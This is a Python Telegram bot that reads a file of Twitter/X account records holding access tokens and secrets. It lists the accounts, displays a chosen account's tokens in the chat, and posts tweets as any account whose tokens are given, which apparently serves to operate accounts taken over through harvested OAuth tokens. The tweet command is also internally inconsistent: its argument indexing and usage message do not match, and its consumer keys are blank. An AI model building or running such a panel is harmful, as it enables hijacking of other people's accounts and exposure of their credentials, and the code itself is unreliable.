```py
import json
import telebot
import tweepy

consumer_key = 'consumer SECRET'
consumer_secret = 'consumer SCRET'
with open('user_logs.json', 'r') as file:
    users_data = json.load(file)

bot = telebot.TeleBot("bottoken")

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, 'ℹ️ Use users, getinfo, or tweet commands')

@bot.message_handler(commands=['users'])
def get_users(message):
    users_list = "\n".join(f"*🪪{user['Username']}*~*👥{user['Followers']}" for user in users_data)
    bot.reply_to(message, f"\n{users_list}", parse_mode="Markdown")

@bot.message_handler(commands=['getinfo'])
def get_info(message):
    args = message.text.split()[1:]
    if args:
        username = args[0]
        user_info = next((user for user in users_data if user["Username"] == username), None)
        if user_info:
            formatted_info = f"**🪪~Username:** {user_info['Username']}\n\n**👥~Followers:** {user_info['Followers']}\n\n**🔑~Access Token[[C]]: **{user_info['Access Token']}\n\n**🔑~Access Token[[S]]: **{user_info['Access Token Secret']}"
            bot.reply_to(message, formatted_info, parse_mode="Markdown")
        else:
            bot.reply_to(message, f"❔User '{username}' not found.")
    else:
        bot.reply_to(message, "❔Please provide a username.")

@bot.message_handler(commands=['tweet'])
def post_tweet(message):
    args = message.text.split()[1:]
    try:
        if len(args) >= 4:
            client_id, client_secret = args[:2]
            tweet_text = ' '.join(args[4:])
            client = tweepy.Client(
                consumer_key="",
                consumer_secret="",
                access_token=client_id,
                access_token_secret=client_secret
            )
            client.create_tweet(text=tweet_text)
            bot.reply_to(message, "🐤Tweet posted Successfully")
        else:
            bot.reply_to(message, "❔Please provide at least four inputs:  client_id, client_secret, tweet_text.")
    except Exception as e:
        bot.reply_to(message, f"❌An error occurred while running this command")

bot.polling()
```
